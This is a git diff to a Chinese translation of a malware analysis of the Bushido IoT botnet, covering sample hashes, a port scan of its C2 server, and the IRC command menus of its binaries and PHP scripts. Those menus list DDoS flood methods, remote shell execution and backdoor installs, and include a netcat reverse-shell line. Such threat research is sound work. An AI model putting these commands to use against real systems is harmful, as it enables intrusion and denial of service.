@@ -1,5 +1,21 @@
+---
+title: 逆向 Bushido IOT 僵尸网络
+author: jiayy
+data: 2018-09-03
+---
 
-### 逆向 Bushido IOT 僵尸网络
+# 逆向 Bushido IOT 僵尸网络
+
+[原文](http://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/)
+
+* [恶意样本](#malware_samples)
+* [静态分析](#static_analysis)
+* [扫描服务器](#scan_server)
+* [CNC服务器](#cnc_server)
+* [IRC服务器](#irc_server)
+* [恶意样本的功能](#malware_functionality)
+* [恶意样本背后的人](#bad_actors)
+* [结论](conclusion)
 
 这篇文章介绍一个代号为 Bushido 的僵尸网络，据悉该僵尸网络背后组织为 Offsecurity.  很有意思的是，这个僵尸网络既可以控制 IOT 设备作为发动 DOS 攻击的载体，也可以控制 web 服务器，文章会介绍它怎么通过若干 shell 脚本感染众多目标设备，同时也会分析该恶意软件背后的黑客。
 
@@ -10,30 +26,32 @@
 在这篇文章里我们选择了逆向分析 64位平台的 ELF 样本，其他平台的样本逻辑功能是一样的。
 
 ## 恶意样本
+<span id="malware_samples"></span>
 
 下面是我们分析出来的所有样本文件
 
 
-FILE HASH VALUE	                                                        FILE NAME	FUNCTION
-4c1ff6424e1d47921a9c3822c67b6d288e67781d22ee1bc4f82fc11509bfb479	a09rndgxtx	botnet binary
-40a9be5a72284a14939271e244a9904142c7e87e64d2b1a476b51d36c5f2de26	a88hfdje8	botnet binary
-f4bed53e2a0d273f00e82825607164ad20caa5f1a02e48e4b5627a819f49df8b	ab89484bdhd	botnet binary
-d12ffbef4d85806d77294377956c4ecc48ac9b8c3bddbf26a917723f80c719fb	adjde99vhc	botnet binary
-c1b12ad1eb4e64896a66dc9b4e83f0e3a7d2d4c79819b68853f0f64fd329ac83	adjs8993bd	botnet binary
-37ac5b9aef6955a7a393d87ee656656851c313896fdeaff3b591e68ebda7a21d	agf63683gd	botnet binary
-5a8a8ea38ac8202373474e5ce535efd2302543a5aa595aa00bd3b553467ffd34	alfkdcj9e8	botnet binary
-fd171c6b8f870bf64885cb05a5f1da3581537810652a9714a592c21889722198	alo99edgwu	botnet binary
-9bad4e105c1701c965fd65118a14e06d222ca13eb9adb3c9e1e4fd7a80374087	apr98dgs5c	botnet binary
-ca5bb4a794663f35c1ded854e5157e8d077624501514ecac329be7ada8e0248c	aqerd783nd	botnet binary
-7c492dde22c828fffc3067ef6aaa5d466cab76858079ce57492ce9bbfd7e449a	atyur7837s	botnet binary
-5fb8b5590b4845b31988f636a5a09b02bdbb3e730dd1f78d8f04a02013cb760d	ambvjcv9e0	botnet binary
-70d7adcd931eb49ede937b64f1653a6710fbcea891e2ab186165cff1d3429945	8UsA1.sh	infection script
-36f38298c5345abf9f0036890b357610078327a4a0a0e61db79fe7afb591830d	update.sh	infection script
-eabee288c9605b29f75cd23204b643cfe4d175851b7d57c3d3d73703bd0f8ec8	ftp1.sh	        download the malware samples via ftp and install it
-2544f0299a5795bf12494e2cbe09701cb024b06a0b924c91de0d35efb955a5fe	pma.php	        php botnet more on it in later section
-18d6a4280adf67e2adf7a89aa11faa93a5ed6fc9d64b31063386d762b92b45d3	pma.pl	        pearl botnet more on it in later section
+* FILE HASH VALUE	                                                        FILE NAME	FUNCTION
+* 4c1ff6424e1d47921a9c3822c67b6d288e67781d22ee1bc4f82fc11509bfb479	a09rndgxtx	botnet binary
+* 40a9be5a72284a14939271e244a9904142c7e87e64d2b1a476b51d36c5f2de26	a88hfdje8	botnet binary
+* f4bed53e2a0d273f00e82825607164ad20caa5f1a02e48e4b5627a819f49df8b	ab89484bdhd	botnet binary
+* d12ffbef4d85806d77294377956c4ecc48ac9b8c3bddbf26a917723f80c719fb	adjde99vhc	botnet binary
+* c1b12ad1eb4e64896a66dc9b4e83f0e3a7d2d4c79819b68853f0f64fd329ac83	adjs8993bd	botnet binary
+* 37ac5b9aef6955a7a393d87ee656656851c313896fdeaff3b591e68ebda7a21d	agf63683gd	botnet binary
+* 5a8a8ea38ac8202373474e5ce535efd2302543a5aa595aa00bd3b553467ffd34	alfkdcj9e8	botnet binary
+* fd171c6b8f870bf64885cb05a5f1da3581537810652a9714a592c21889722198	alo99edgwu	botnet binary
+* 9bad4e105c1701c965fd65118a14e06d222ca13eb9adb3c9e1e4fd7a80374087	apr98dgs5c	botnet binary
+* ca5bb4a794663f35c1ded854e5157e8d077624501514ecac329be7ada8e0248c	aqerd783nd	botnet binary
+* 7c492dde22c828fffc3067ef6aaa5d466cab76858079ce57492ce9bbfd7e449a	atyur7837s	botnet binary
+* 5fb8b5590b4845b31988f636a5a09b02bdbb3e730dd1f78d8f04a02013cb760d	ambvjcv9e0	botnet binary
+* 70d7adcd931eb49ede937b64f1653a6710fbcea891e2ab186165cff1d3429945	8UsA1.sh	infection script
+* 36f38298c5345abf9f0036890b357610078327a4a0a0e61db79fe7afb591830d	update.sh	infection script
+* eabee288c9605b29f75cd23204b643cfe4d175851b7d57c3d3d73703bd0f8ec8	ftp1.sh	        download the malware samples via ftp and install it
+* 2544f0299a5795bf12494e2cbe09701cb024b06a0b924c91de0d35efb955a5fe	pma.php	        php botnet more on it in later section
+* 18d6a4280adf67e2adf7a89aa11faa93a5ed6fc9d64b31063386d762b92b45d3	pma.pl	        pearl botnet more on it in later section
 
 ## 静态分析
+<span id="static_analysis"></span>
 
 首先，查看二进制文件的文件信息
 
@@ -218,7 +236,8 @@ powerpc
 
 通过上述字符串可以大概判断本恶意软件的功能，但是为了搞清楚其工作流程，以及如何与 CNC 服务器连接，我们需要深入分析，由于我们已经知道了 ip 地址，我们可以直接对 CNC 服务器做端口扫描等渗透操作
 
-## 渗透 CNC 服务器
+## 扫描服务器
+<span id="scan_server"></span>
 
 从可执行文件里得到CNC服务器ip地址后，很自然而然就会进行端口扫描，通过扫描我得到以下结果
 
@@ -271,19 +290,22 @@ OS details: Linux 2.6.18 - 2.6.22
 ```
 
 ## CNC 服务器
+<span id="cnc_server"></span>
 
 从上述分析我得出结论，这个恶意样本是通过服务器A基于 IRC 控制的僵尸网络，使用IRC客户端链接CNC服务器后可以发现有两个频道
 
 1. #pma - 恶意脚本感染了web服务器后会通过 IRC 加入 CNC 服务器的这个频道
 2. #zull - 恶意二进制感染了iot设备后通过 IRC 加入 CNC 服务器的这个频道
 
-## IRC 服务器
+### IRC 服务器
+<span id="irc_server"></span>
 
 恶意样本连接 IRC 服务的命令格式如 NICK[ZULL|x86_64]ZM5z， 这个命令表示恶意样本 NICK[] 加入 IRC 频道 #zull, 使用的密码是写死在可执行文件里的，如下
 
 [](http://www.mien.in/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/botnet-credentials.png)
 
 ## 恶意样本的功能
+<span id="malware_functionality"></span>
 
 通过分析可以知道恶意样本具备以下能力：
 
@@ -301,73 +323,76 @@ OS details: Linux 2.6.18 - 2.6.22
 
 小结一下，这个恶意样本终端包括运行在 IOT 设备上恶意可执行文件和运行在web服务器上的恶意脚本，这些恶意终端会连接 IRC 服务器对应的频道，iot 设备的恶意终端连接 #zull 频道，web 服务器的恶意终端连接 #pma 频道，然后等待 IRC 服务器下发指令，这些指令整理如下：
 
-## 恶意可执行文件拥有的指令
+### 恶意可执行文件拥有的指令
+<span id="binary_functionality"></span>
 
-Non-root/non-spoof DDoS commands commands :
-STD: A non spoof HIV STD flooder
-HOLD: A vanilla TCP connect flooder
-JUNK: A vanilla TCP flooder (modded)
-UNKNOWN<port, 0 for random> <packet size, 0 for random>: An advanced non spoof UDP flooder modified by Freak
-HTTP: An extremely powerful HTTP flooder
-Spoof/root commands :
-UDP: A UDP flooder
-PAN: An advanced syn flooder that will kill most network drivers
-TCP: An advanced TCP flooder with multithreading. Will kill almost any service.
-PHATWONK<flags/method>: A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.
-BLACKNURSE: An ICMP packet flooder that will crash most firewalls and use loads of CPU.
-Other commands :
-RNDNICK : Randomizes the knights nick
-NICK: Changes the nick of the client
-SERVER: Changes servers
-GETSPOOFS : Gets the current spoofing
-SPOOFS: Changes spoofing to a subnet
-DISABLE : Disables all packeting from this client
-ENABLE : Enables all packeting from this client
-KILL : Kills the knight
-DNS2IP
-GET: Downloads a file off the web and saves it onto the hd
-UPDATE<src:bin> : Update this bot
-HACKPKG: HackPkg is here! Install a bin, using http, no depends!
-VERSION : Requests version of client
-KILLALL : Kills all current packeting
-HELP : Displays this
-IRC: Sends this command to the server
-SH: Executes a command
-ISH: SH, interactive, sends to channel
-SHD: Executes a psuedo-daemonized command
-GETBB: Get a proper busybox
-INSTALL <http server/file_name> : Download & install a binary to /var/bin
-BASH: Execute commands using bash.
-BINUPDATE http:server/package : Update a binary in /var/bin via wget
-SCAN: Call the nmap wrapper script and scan with your opts.
-RSHELL: Equates to nohup nc ip port -e /bin/sh
-LOCKUP http:server : Kill telnet, d/l aes backdoor from, run that instead.
-GETSSH http:server/dropbearmulti : D/l, install, configure and start dropbear on port 30022.
+* Non-root/non-spoof DDoS commands commands :
+* STD: A non spoof HIV STD flooder
+* HOLD: A vanilla TCP connect flooder
+* JUNK: A vanilla TCP flooder (modded)
+* UNKNOWN<port, 0 for random> <packet size, 0 for random>: An advanced non spoof UDP flooder modified by Freak
+* HTTP: An extremely powerful HTTP flooder
+* Spoof/root commands :
+* UDP: A UDP flooder
+* PAN: An advanced syn flooder that will kill most network drivers
+* TCP: An advanced TCP flooder with multithreading. Will kill almost any service.
+* PHATWONK<flags/method>: A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.
+* BLACKNURSE: An ICMP packet flooder that will crash most firewalls and use loads of CPU.
+* Other commands :
+* RNDNICK : Randomizes the knights nick
+* NICK: Changes the nick of the client
+* SERVER: Changes servers
+* GETSPOOFS : Gets the current spoofing
+* SPOOFS: Changes spoofing to a subnet
+* DISABLE : Disables all packeting from this client
+* ENABLE : Enables all packeting from this client
+* KILL : Kills the knight
+* DNS2IP
+* GET: Downloads a file off the web and saves it onto the hd
+* UPDATE<src:bin> : Update this bot
+* HACKPKG: HackPkg is here! Install a bin, using http, no depends!
+* VERSION : Requests version of client
+* KILLALL : Kills all current packeting
+* HELP : Displays this
+* IRC: Sends this command to the server
+* SH: Executes a command
+* ISH: SH, interactive, sends to channel
+* SHD: Executes a psuedo-daemonized command
+* GETBB: Get a proper busybox
+* INSTALL <http server/file_name> : Download & install a binary to /var/bin
+* BASH: Execute commands using bash.
+* BINUPDATE http:server/package : Update a binary in /var/bin via wget
+* SCAN: Call the nmap wrapper script and scan with your opts.
+* RSHELL: Equates to nohup nc ip port -e /bin/sh
+* LOCKUP http:server : Kill telnet, d/l aes backdoor from, run that instead.
+* GETSSH http:server/dropbearmulti : D/l, install, configure and start dropbear on port 30022.
 
-## 恶意脚本拥有的指令
+### 恶意脚本拥有的指令
+<span id="script_functionality"></span>
 
-mail [to] [from] [subject] [message]
-dns [host]
-rndnick
-raw [irc] [data]
-uname
-eval [php] [code]
-exec [command] [args]
-cmd [command] [args]
-udpflood [ip] [port] [time] [packet] [size]
-tcpconn [host] [port] [time]
-slowread [host] [port] [page] [sockets] [time]
-slowloris [host] [time]
-l7 method [host] [time]
-post [host] time
-head [host] [time]
-tcpflood [host] [port] [time]
-httpflood [host] [port] [time] [method] [url]
-proxyhttpflood [targetUrl(with http://)] [proxyListUrl] [time] [method]
-cloudflareflood [host] [port] [time] [method] [url] [postFields]
-ud.server [host] [port] [pass] [chan]
+* mail [to] [from] [subject] [message]
+* dns [host]
+* rndnick
+* raw [irc] [data]
+* uname
+* eval [php] [code]
+* exec [command] [args]
+* cmd [command] [args]
+* udpflood [ip] [port] [time] [packet] [size]
+* tcpconn [host] [port] [time]
+* slowread [host] [port] [page] [sockets] [time]
+* slowloris [host] [time]
+* l7 method [host] [time]
+* post [host] time
+* head [host] [time]
+* tcpflood [host] [port] [time]
+* httpflood [host] [port] [time] [method] [url]
+* proxyhttpflood [targetUrl(with http://)] [proxyListUrl] [time] [method]
+* cloudflareflood [host] [port] [time] [method] [url] [postFields]
+* ud.server [host] [port] [pass] [chan]
 
-## 恶意样本的始作俑者
+## 恶意样本背后的人
+<span id="bad_actors"></span>
 
 当我们连接上 IRC 服务器的时候会发现如下信息：
 
@@ -375,18 +400,16 @@ ud.server [host] [port] [pass] [chan]
 
 我在 twitter 上搜索以上关键字，结果发现了两个账号
 
-[m4licious](https://twitter.com/m4licious_0sec)
-[M1rOx](https://twitter.com/M1r0x__)
+* [m4licious](https://twitter.com/m4licious_0sec)
+* [M1rOx](https://twitter.com/M1r0x__)
 
 这些账号属于某个称为 Offsecurity 的组织，我猜测他们试图将这个僵尸网络出售，通过一点谷歌搜索我发现了更多信息：
 
-[Twitter](https://twitter.com/zullsec)
-[facebook](https://www.facebook.com/ZullSec)
-[youtube](https://www.youtube.com/watch?v=l2m-i0pmC9w)
+* [Twitter](https://twitter.com/zullsec)
+* [facebook](https://www.facebook.com/ZullSec)
+* [youtube](https://www.youtube.com/watch?v=l2m-i0pmC9w)
 
 ## 结论
+<span id="conclusion"></span>
 
 这个恶意软件并没有新奇的行为，我猜测它是根据开源工具 Mirai 改的，他们通过控制web服务器和 iot 设备发动 DDOS 攻击，并通过 IRC 服务器控制所以恶意终端。
-``` bash
-
-```
